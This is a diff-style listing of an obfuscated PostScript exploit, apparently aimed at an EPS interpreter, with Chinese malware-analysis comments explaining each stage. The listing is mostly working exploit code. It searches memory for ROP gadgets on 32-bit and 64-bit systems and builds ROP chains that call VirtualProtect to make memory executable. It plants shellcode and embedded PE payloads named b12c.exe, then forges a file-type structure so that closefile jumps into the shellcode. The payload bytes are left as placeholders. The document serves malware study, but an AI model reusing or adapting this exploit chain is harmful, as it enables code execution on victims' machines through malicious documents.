+        l326 65535 and 16 eq 
+        { 
+            /l325 l327 2147483647 and l319 my_add def 
+            /l323 l325 12 my_add l201 get_word def 
+            /l324 l325 14 my_add l201 get_word def 
+            /l325 l324 l323 add 1 sub 4 mul l325 16 my_add my_add 4 my_add l201 get_dword def 
+            /l325 l325 2147483647 and l319 my_add def 
+            /l323 l325 12 my_add l201 get_word def 
+            /l324 l325 14 my_add l201 get_word def 
+            /l335 l324 l323 add 1 sub 4 mul l325 16 my_add my_add 4 my_add l201 get_dword def 
+            /l335 l335 2147483647 and l319 my_add def 
+            /l337 l335 l201 get_dword l204 my_add def 
+            /l338 l335 4 my_add l201 get_word def 
+            /l339 l337 40 my_add def 
+            /l340 l339 8 my_add l201 get_dword def 
+            /l341 l339 12 my_add l201 get_dword def 
+            /l342 l340 -16 bitshift def 
+            /l343 l340 65535 and def 
+            /l344 l341 -16 bitshift def 
+            /l345 l341 65535 and def 
+            exit 
+        } if 
+        /l325 l325 8 my_add def 
+    } repeat                                    %% 感觉函数没什么用.
+} bind def 
+/payload_32 <pe内嵌文件> def                    %% 32位恶意代码
+l99 1 eq 
+{                                               %% 64位环境
+    /l348 308740 def 
+    /l349 65555 l348 add def 
+    /l350 l349 string def 
+    l350 39 <shellcode 代码> putinterval 
+    l350 16384 <第二个pe文件> putinterval        %% 64位恶意代码
+    l350 65280 (b12c.exe) putinterval 
+    65532 l348 l350 put_data_to_array 
+    l350 65536 payload_32 putinterval 
+    l159 4 l350 put 
+    l173 l201 get_qword 
+    /l351 exch def 
+    /l352 exch def 
+    l351 l201 get_qword 
+    /l353 exch def 
+    /l354 exch def 
+    l353 64 my_add l201 get_qword 
+    /l355 exch def 
+    /l356 exch def 
+    l355 l201 get_qword 
+    /l357 exch def 
+    /l358 exch def 
+    l357 56 my_add l201 get_qword 
+    /l359 exch def /l360 exch def 
+    l360 truncate 
+    pop 
+    l359 ln 
+    pop 
+}
+{                                           %% 32位环境
+    l314                                    %% 当前模块地址:epsimp32
+    l316 
+    /l348 308740 def                        %% l348 = 0x04B604  <pe内嵌文件>文件大小
+    /l349 65555 l348 add def                %% l349 = 0x05B617
+    /l350 l349 string def                   %% 字符串大小：0x05b617
+    l342 2006 eq 
+    { 
+        l350 0 <89EC83EC1889E028002800> putinterval 
+    }
+    { 
+        l350 0 <89EC83EC2089E028002800> putinterval 
+    } ifelse 
+    l350 11 <第二段shellcode> putinterval        %% 填充shellcode，大小0x1600。
+    l350 16384 <第三个pe文件> putinterval        %% dll文件，动态加载pe文件，大小:0x6600,位置0x4000          
+    l350 65280 (b12c.exe) putinterval            %% 偏移+0xFF00, 写入文件名～
+    65532 l348 l350 put_data_to_array            %% 把l348 数据写入到索引：0xFFFC的字符串数组l350。
+    l350 65536 payload_32 putinterval            %% 把恶意代码payload_32写入到索引:0x10000 的字符串内。
+    l159 3 l350 put                              %% 把字符串保存在索引：3 的数组l159内。
+    
+    l198 l201 get_dword                          %% 从字符串l201提取索引：l198 的数据,dword。 l198 = 0x00EB1950
+    /l364 exch def 
+    l364 l201 get_dword                          %% 索引l198保存的为指针，使用此指针作为索引，再次取值。
+    /l365 exch def 
+    l365 36 my_add l201 get_dword                %% 上面获取的值 + 0x24，值作为索引，再次取值。pp_struct
+    /l366 exch def 
+    l366 l201 get_dword                          %% 使用上面的值，作为索引，取值。
+    /l367 exch def 
+    l367 32 my_add l201 get_dword                %% 取值 + 0x20, 结果作为索引，再次取值。ptr_data 指向字符串数组的内容。
+    /l368 exch def 
+    l368 ln                                      %% 把取出的值 求自然对数。  l368 = 0x01030048
+    pop                                          %% 结果弹出，，我擦，上面垃圾指令～
+} ifelse 
+
+%%==============================================第六阶段===========================
+
+/l369                                            %% 32位环境
+{
+    /l370 l314 (KERNEL32.dll) (VirtualProtect) l250 def    %% l314 = 0x8f0000, l370 = 0x7c801ad4(VirtualProtect地址)。
+    /l371 0 def 
+    /l372 l314 4096 my_add def                   %% l372 = 0x1000 + 0x8f0000
+    l201 l372 458752 getinterval                 %% 从字符串l201中提取子串:开始索引0x8f1000,大小0x70000。提取当前模块自身。
+    dup dup                                      %% 当前操作堆栈，三份子串。
+    <94 00 00 00 00 5E c3> search                %% 搜索特征符,如果存在，则会返回：ture, 匹配字符串前部分，匹配字符部分，匹配字符后部分。
+    {                                            %% 不存在，返回：flase， 全部字符串。
+        length l372 my_add 
+        /l373 exch def                           %% l373 = 0x00914d8a ,特征符的地址：
+        pop                                      %% 00914D8A    94              xchg    eax, esp
+        pop                                      %% 00914D8B    0000            add     byte ptr [eax], al
+    }                                            %% 00914D8D    0000            add     byte ptr [eax], al
+    {                                            %% 00914D8F    5E              pop     esi
+        pop                                      %% 00914D90    C3              retn
+        /l371 1 def                              %% 没有搜索到。
+    } ifelse 
+    l371 0 eq 
+    { 
+        dup <5E C3> search 
+        { 
+            length l372 my_add                   %% l375 = 0x8FCFFA : 
+            /l375 exch def                       %% 008FCFFA    5E            pop     esi
+            pop                                  %% 008FCFFB    C3            retn                        
+            pop 
+        }
+        { 
+            pop 
+            /l371 1 def 
+        } ifelse 
+    } if 
+    l371 0 eq 
+    { 
+        dup <c2 0c 00> search 
+        { 
+            length l372 my_add   
+            /l377 exch def                       %% l372 = 0x8fc543 :    008FC543    C2 0C 00      retn    0Ch
+            pop 
+            pop 
+        }
+        { 
+            pop 
+            /l371 1 def 
+        } ifelse 
+    } if 
+    l371 1 eq 
+    { 
+        dup <94 c3> search                      %% 94            xchg    eax, esp
+        {                                       %% C3            retn
+            length l372 my_add 
+            /l373 exch def 
+            pop 
+            pop 
+        }
+        {
+            pop 
+            /l371 2 def 
+        } ifelse 
+    } if 
+    l371 1 eq 
+    { 
+        <c2 0c 00> search                       %%　C2 0C00       retn    0C
+        { 
+            length l372 my_add
+            /l375 exch def 
+            pop 
+            pop
+        }
+        { 
+            pop 
+            /l371 2 def 
+        } ifelse 
+    } if 
+    l371 2 eq 
+    { 
+        dup <94 00 00 00 5f 5e 5b c2 04 00> search 
+        {                                       %% 94            xchg    eax, esp
+            length l372 my_add                  %% 0000          add     byte ptr [eax], al
+            /l373 exch def                      %% 005F 5E       add     byte ptr [edi+5E], bl
+            pop                                 %% 5B            pop     ebx
+            pop                                 %% C2 0400       retn    4
+        }
+        { pop quit } ifelse
+    } if 
+} bind def 
+/l384                                            %% 64位环境
+{
+    l287 l299 (KERNEL32.dll) (VirtualProtect) l259 
+    /l385 exch def 
+    /l386 exch def 
+    /l372 l299 4096 my_add def 
+    /l388 l287 l372 688128 getinterval def 
+    l388 /l371 0 def 
+    dup <50 FF 50 30> search 
+    { 
+        length l372 my_add l294 my_add 
+        /l390 exch def 
+        /l391 l295 def 
+        pop 
+        pop 
+    }
+    {
+        pop 
+        /l371 1 def 
+    } ifelse 
+    l371 0 eq 
+    { 
+        dup <4C 8D 4C 24 60 48 8B CF FF 90 B0 00 00 00> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l393 exch def 
+            /l394 l295 def 
+            pop 
+            pop 
+        }
+        { 
+            pop 
+            /l371 1 def 
+        } ifelse 
+    } if 
+    l371 0 eq 
+    { 
+        dup <5D 48 FF 60 20> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l396 exch def 
+            /l397 l295 def 
+            pop 
+            pop 
+        }
+        { 
+            pop 
+            /l371 1 def 
+        } ifelse 
+    } if 
+    l371 0 eq 
+    { 
+        dup <5D 48 FF 60 18> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l399 exch def 
+            /l400 l295 def 
+            pop 
+            pop 
+        }
+        { 
+            pop 
+            /l371 1 def 
+        } ifelse 
+    } if 
+    l371 0 eq 
+    { 
+        dup <5C C3> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l402 exch def 
+            /l403 l295 def 
+            pop 
+            pop 
+        }
+        {
+            pop 
+            /l371 1 def 
+        } ifelse 
+    } if 
+    l371 0 eq 
+    { 
+        dup <C2 88 00> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l405 exch def 
+            /l406 l295 def 
+            pop 
+            pop 
+        }
+        { 
+            pop 
+            /l371 1 def
+        } ifelse 
+    } if 
+    l371 0 eq { dup <59 C3> search { length l372 my_add l294 my_add /l408 exch def /l409 l295 def pop pop }{ pop /l371 1 def } ifelse } if 
+    l371 0 eq { dup <5A C3> search { length l372 my_add l294 my_add /l411 exch def /l412 l295 def pop pop }{ pop /l371 1 def } ifelse } if 
+    l371 0 eq { dup <41 58 5d c3> search { length l372 my_add l294 my_add /l414 exch def /l415 l295 def pop pop }{ pop /l371 1 def } ifelse } if 
+    l371 1 eq { dup <4C 8B 18 48 8B C8 41 FF 53 08> search { length l372 my_add l294 my_add /l390 exch def /l391 l295 def pop pop }{ pop /l371 2 def } ifelse } if 
+    l371 1 eq { dup <4C 8D 4C 24 20 48 8B 01 44 8B C3 FF 50 20> search { length l372 my_add l294 my_add /l393 exch def /l394 l295 def pop pop }{ pop /l371 2 def } ifelse } if 
+    l371 1 eq { dup <49 8B E3 41 5E 41 5D 41 5C C3> search { length l372 my_add l294 my_add /l396 exch def /l397 l295 def pop pop }{ pop /l371 2 def } ifelse } if 
+    l371 1 eq { dup <41 5D 41 5C C3> search { length l372 my_add l294 my_add /l399 exch def /l400 l295 def pop pop }{ pop /l371 2 def } ifelse } if 
+    l371 1 eq { dup <59 C3> search { length l372 my_add l294 my_add /l402 exch def /l403 l295 def pop pop }{ pop /l371 2 def } ifelse } if 
+    l371 1 eq { dup <5A C3> search { length l372 my_add l294 my_add /l405 exch def /l406 l295 def pop pop }{ pop /l371 2 def } ifelse } if 
+    l371 1 eq { dup <41 58 c3> search { length l372 my_add l294 my_add /l408 exch def /l409 l295 def pop pop }{ pop /l371 2 def } ifelse } if
+    l371 2 eq { dup <50 FF 50 30> search { length l372 my_add l294 my_add /l390 exch def /l391 l295 def pop pop }{ pop /l371 3 def } ifelse } if 
+    l371 2 eq { dup <4C 8D 4C 24 20 FF 50 20> search { length l372 my_add l294 my_add /l393 exch def /l394 l295 def pop pop }{ pop /l371 3 def } ifelse } if 
+    l371 2 eq { dup <5B 48 FF A0 88 00 00 00> search { length l372 my_add l294 my_add /l396 exch def /l397 l295 def pop pop }{ pop /l371 3 def } ifelse } if 
+    l371 2 eq { dup <5F 48 FF 60 28> search { length l372 my_add l294 my_add /l399 exch def /l400 l295 def pop pop }{ pop /l371 3 def } ifelse } if 
+    l371 2 eq { dup <5C C3> search { length l372 my_add l294 my_add /l402 exch def /l403 l295 def pop pop }{ pop /l371 3 def } ifelse } if 
+    l371 2 eq { dup <C2 88 00> search { length l372 my_add l294 my_add /l405 exch def /l406 l295 def pop pop }{ pop /l371 3 def } ifelse } if
+    l371 2 eq { dup <59 C3> search { length l372 my_add l294 my_add /l408 exch def /l409 l295 def pop pop }{ pop /l371 3 def } ifelse } if 
+    l371 2 eq { dup <5A C3> search { length l372 my_add l294 my_add /l411 exch def /l412 l295 def pop pop }{ pop /l371 3 def } ifelse } if 
+    l371 2 eq { dup <41 58 F2 0F 11 49 60 C3> search { length l372 my_add l294 my_add /l414 exch def /l415 l295 def pop pop }{ pop /l371 3 def } ifelse } if 
+    l371 3 eq 
+    { 
+        dup <89 91 a0 00 00 00 33 c0 4c 89 41 78> search 
+        { length l372 my_add l294 my_add /l465 exch def /l466 l295 def pop pop }{ pop quit } ifelse 
+        dup <73 74 72 69 6E 67 77 69 64 74 68> search { length l372 my_add l294 my_add /l467 exch def /l468 l295 def pop pop }{ pop quit } ifelse 
+        /l469 8 string def 
+        0 l468 l467 l469 put_2data_to_array dup l469 search { length l372 my_add l294 my_add /l470 exch def /l471 l295 def pop pop }{ pop quit } ifelse 
+        l470 8 my_add 2147483647 and l287 get_qword 
+        /l472 exch def 
+        /l473 exch def 
+        dup <5C C3> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l390 exch def 
+            /l391 l295 def 
+            pop 
+            pop 
+        }
+        { pop quit } ifelse 
+        dup <59 C3> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l393 exch def 
+            /l394 l295 def 
+            pop 
+            pop 
+        }{ pop quit } ifelse 
+        dup <5A C3> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l396 exch def 
+            /l397 l295 def 
+            pop 
+            pop 
+        }{ pop quit } ifelse 
+        dup <49 58 C3> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l399 exch def 
+            /l400 l295 def 
+            pop 
+            pop 
+        }{ pop quit } ifelse 
+        dup <4B 59 48 83 C4 30 5B C3> search 
+        { 
+            length l372 my_add l294 my_add 
+            /l402 exch def 
+            /l403 l295 def 
+            pop 
+            pop
+        }{ pop quit } ifelse 
+    } if 
+} bind def 
+l99 1 eq { l384 }{ l369 } ifelse                 %% 查找特征符，为rop链作准备。
+
+%%==============================================第七阶段===========================
+
+/l484                   
+{                                                %% 32位环境
+    /l485 1024 def 
+    /l486 l485 string def 
+    l159 2 l486 put                              %% 申请大小0x400的字符串保存在，l159 的2号索引。
+    l199 l201 get_dword                          %% >>>>>>>>>>>>>>>>>
+    /l487 exch def                               %% l199 = 0x0eb1940, 提取地址00eb1940的数据。l199 保存的值：ps_obj.value2 
+    l487 l201 get_dword                          %% 
+    /l488 exch def                               %%
+    l488 36 my_add l201 get_dword                %% 对字符串对象结构的操作，得到字符串结构的地址,结构大小：0x30那个。
+    /l489 exch def                               %% 
+    l489 l201 get_dword                          %% 
+    /l490 exch def                               %% 
+    l490 32 my_add l201 get_dword                %% l491 = 0x0fc09f8 指向该字符串对象保存字符的位置.
+    /l491 exch def                               %% >>>>>>>>>>>>>>>>>
+    l199 l491 l201 put_data_to_array             %% 把l491 数据保存到索引l199的l201数组内，由于数组的基地址为0，所用数据写入到l199地址内。
+    l199 12 my_sub 2304 l201 put_data_to_array   %% 2304(0x900) 保存到：l199 - 0xc, 文件类型标记：0x900。
+    /l492 l491 50 my_add def 
+    l491 l492 l201 put_data_to_array             %% l491+0x32 值保存到：l491 地址内。
+    /l493 l491 512 my_add def                    %% l493 = l491 + 0x200    0x0fc0bf8。
+    l371 0 eq 
+    { 
+        l342 2006 eq                             %% l342 = 0x07d6(2006)
+        { 
+            l350 0 <89EC83EC1889E028002800> putinterval 
+        }
+        { 
+            l350 0 <89EC83EC2089E028002800> putinterval 
+        } ifelse 
+        l492 0 l201 put_data_to_array                 %% 向l492 地址写入数据，构建一个结构。如下
+        l492 4 my_add l375 l201 put_data_to_array     %% 00FC0A2A  00 00 00 00 FA CF 8F 00 8A 4D 91 00 43 C5 8F 00
+        l492 8 my_add l373 l201 put_data_to_array     %% 00FC0A3A  D4 1A 80 7C 00 00 00 00 00 00 00 00 00 00 00 00 
+        l492 12 my_add l377 l201 put_data_to_array    %% 00FC0A4A  48 00 03 01 48 00 03 01 17 B6 05 00 40 00 00 00
+        l492 16 my_add l370 l201 put_data_to_array    %% 00FC0A5A  F8 0B FC 00
+        l492 20 my_add 0 l201 put_data_to_array       %% 其中包含有rop链的地址，shellcode的地址，VirtualProtectEx地址。
+        l492 24 my_add 0 l201 put_data_to_array       %% +0 0; +0x4, pop esi, ret 地址; +0x8, xchg eax,esp ..地址;
+        l492 28 my_add 0 l201 put_data_to_array       %% +0xc, retn 0Ch; +0x10, VirtualProtect地址;
+        l492 32 my_add l368 l201 put_data_to_array    %% +0x14, +0x18, +0x1c  都是0; 
+        l492 36 my_add l368 l201 put_data_to_array    %% +0x20, +0x24  shellcode地址; VirtualProtect参数: lpAddress   
+        l492 40 my_add l349 l201 put_data_to_array    %% +0x28, shellcode大小;        VirtualProtect参数: dwSize 
+        l492 44 my_add 64 l201 put_data_to_array      %% +0x2c, 64(0x40) VirtualProtect参数flNewProtect PAGE_EXECUTE_READWRITE;
+        l492 48 my_add l493 l201 put_data_to_array    %% +0x30, 参数lpflOldProtect,保存原来内存属性。
+    } if 
+    l371 1 eq 
+    { 
+        l350 0 <89EC83EC1C909090909090> putinterval 
+        l492 l375 l201 put_data_to_array 
+        l492 4 my_add l375 l201 put_data_to_array 
+        l492 8 my_add l373 l201 put_data_to_array 
+        l492 12 my_add 0 l201 put_data_to_array 
+        l492 16 my_add 0 l201 put_data_to_array 
+        l492 20 my_add l370 l201 put_data_to_array 
+        l492 24 my_add 0 l201 put_data_to_array 
+        l492 28 my_add 0 l201 put_data_to_array 
+        l492 32 my_add 0 l201 put_data_to_array 
+        l492 36 my_add l368 l201 put_data_to_array 
+        l492 40 my_add l368 l201 put_data_to_array 
+        l492 44 my_add l349 l201 put_data_to_array 
+        l492 48 my_add 64 l201 put_data_to_array 
+        l492 52 my_add l493 l201 put_data_to_array
+    } if 
+    l371 2 eq 
+    { 
+        l350 0 <89EC83EC1C89e028009090> putinterval 
+        l492 1 l201 put_data_to_array 
+        l492 4 my_add l370 l201 put_data_to_array 
+        l492 8 my_add l373 l201 put_data_to_array 
+        l492 12 my_add l368 l201 put_data_to_array 
+        l492 16 my_add l368 l201 put_data_to_array 
+        l492 20 my_add l349 l201 put_data_to_array 
+        l492 24 my_add 64 l201 put_data_to_array 
+        l492 28 my_add l493 l201 put_data_to_array 
+    } if 
+    l159 2 get                                  %% 返回构造的file_type
+} bind def 
+/l494                                            %% 64位环境
+{ 
+    /l485 4096 def 
+    /l486 l485 string def 
+    l159 3 l486 put 
+    l171 l201 get_qword 
+    /l497 exch def 
+    /l498 exch def 
+    l497 l201 get_qword 
+    /l499 exch def 
+    /l500 exch def 
+    l499 64 my_add l201 get_qword 
+    /l501 exch def 
+    /l502 exch def 
+    l501 l201 get_qword 
+    /l503 exch def 
+    /l504 exch def 
+    l503 56 my_add l201 get_qword 
+    /l505 exch def 
+    /l506 exch def 
+    l171 l506 l505 l201 put_2data_to_array 
+    l171 16 my_sub 2304 l201 put_data_to_array 
+    l371 3 ne 
+    { 
+        /l507 l505 256 my_add def 
+        l505 l506 l507 l201 put_2data_to_array 
+    } if 
+    l371 1 eq 
+    { 
+        l350 0 <4889FC4881ec480100009090909090909090909090909090909090909090909090909090909090> putinterval 
+        l507 0 my_add l506 l507 64 my_add l201 put_2data_to_array l507 16 my_add l391 l390 l201 put_2data_to_array l507 72 my_add l394 l393 l201 put_2data_to_array l507 88 my_add l400 l399 l201 put_2data_to_array l507 96 my_add l397 l396 l201 put_2data_to_array l507 112 my_add l403 l402 l201 put_2data_to_array l507 120 my_add l360 l359 l201 put_2data_to_array l507 128 my_add l406 l405 l201 put_2data_to_array l507 136 my_add 0 l349 l201 put_2data_to_array l507 144 my_add l409 l408 l201 put_2data_to_array l507 152 my_add 0 64 l201 put_2data_to_array l507 160 my_add l386 l385 l201 put_2data_to_array l507 168 my_add l360 l359 l201 put_2data_to_array 
+    } if 
+    l371 0 eq 
+    { 
+        l350 0 <4889FC4881ecd80000009090909090909090909090909090909090909090909090909090909090> putinterval 
+        l507 0 my_add l406 l405 l201 put_2data_to_array l507 8 my_add l409 l408 l201 put_2data_to_array l507 16 my_add l391 l390 l201 put_2data_to_array l507 24 my_add l403 l402 l201 put_2data_to_array l507 32 my_add l400 l399 l201 put_2data_to_array l507 48 my_add l394 l393 l201 put_2data_to_array l507 152 my_add l360 l359 l201 put_2data_to_array l507 160 my_add l415 l414 l201 put_2data_to_array l507 168 my_add 0 64 l201 put_2data_to_array l507 176 my_add l397 l396 l201 put_2data_to_array l507 184 my_add l412 l411 l201 put_2data_to_array l507 192 my_add 0 l349 l201 put_2data_to_array l507 200 my_add l386 l385 l201 put_2data_to_array l507 208 my_add l360 l359 l201 put_2data_to_array 
+    } if 
+    l371 2 eq 
+    { 
+        l350 0 <4889EC4883ec789090909090909090909090909090909090909090909090909090909090909090> putinterval 
+        l507 0 my_add l406 l405 l201 put_2data_to_array l507 8 my_add l415 l414 l201 put_2data_to_array l507 16 my_add l391 l390 l201 put_2data_to_array l507 32 my_add l397 l396 l201 put_2data_to_array l507 40 my_add l403 l402 l201 put_2data_to_array l507 48 my_add l394 l393 l201 put_2data_to_array l507 136 my_add l400 l399 l201 put_2data_to_array l507 152 my_add 0 64 l201 put_2data_to_array l507 160 my_add l409 l408 l201 put_2data_to_array l507 168 my_add l360 l359 l201 put_2data_to_array l507 176 my_add l412 l411 l201 put_2data_to_array l507 184 my_add 0 l349 l201 put_2data_to_array l507 192 my_add l386 l385 l201 put_2data_to_array l507 200 my_add l360 l359 l201 put_2data_to_array 
+    } if 
+    l371 3 eq 
+    { 
+        /l507 l505 512 my_add def 
+        /l509 l505 3072 my_add def 
+        /l510 l506 def 
+        /l511 l505 384 my_add def 
+        /l512 l505 64 my_add def 
+        /l513 l505 64 my_add def 
+        l505 l506 l507 l201 put_2data_to_array l505 64 my_add l506 l512 l201 put_2data_to_array l505 328 my_add l506 l511 l201 put_2data_to_array l507 16 my_add l473 l472 l201 put_2data_to_array l513 184 my_add l466 l465 l201 put_2data_to_array l511 l506 l511 16 my_add l201 put_2data_to_array l511 8 my_add 4 l201 put_data_to_array l511 12 my_add 8 l201 put_data_to_array l511 88 my_add 1280 l201 put_data_to_array l511 104 my_add l506 l511 112 my_add l201 put_2data_to_array 
+    } if 
+    l159 3 get 
+} bind def 
+
+l99 1 eq { 1 1 1 1 l494 }{ l484 } ifelse 
+/l514 exch def 
+l514 type /filetype eq { }{ } ifelse 
+l514 closefile    %% 跳入shellcode.              
+
+%%　调用closefile时，会调用其中filetype结构的释放函数：[eax+8] eax指向文件结构
+%%  上面伪造的文件类型，进而执行写入的代码。
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+l371 3 eq 
+{ 
+    l512 120 my_add l201 get_qword 
+    /l516 exch def 
+    /l517 exch def 
+    /l516 l516 408 my_sub def 
+    ( l167 l517 l516 l201 put_2data_to_array 0 l287 get_qword /l519 exch def /l520 exch def 8 l287 get_qword /l521 exch def /l522 exch def 0 l391 l390 l287 put_2data_to_array 8 l510 l509 l287 
+    put_2data_to_array l350 0 <48BC000000000000000048B800000000000000004889042448B800000000000000004889442408> putinterval 
+    2 l517 l516 l350 put_2data_to_array 12 l520 l519 l350 put_2data_to_array 26 l522 l521 l350 put_2data_to_array l509 l403 l402 l201 put_2data_to_array l509 8 my_add l510 l509 256 my_add l201 put_2data_to_array l509 72 my_add l394 l393 l201 put_2data_to_array l509 80 my_add l360 l359 l201 put_2data_to_array l509 88 my_add l397 l396 l201 put_2data_to_array l509 96 my_add 0 l349 l201 put_2data_to_array l509 104 my_add l400 l399 l201 put_2data_to_array l509 112 my_add 0 64 l201 put_2data_to_array l509 120 my_add l386 l385 l201 put_2data_to_array l509 128 my_add l360 l359 l201 put_2data_to_array ) cvx exec 
+} if 
+globaldict 
+end quit 
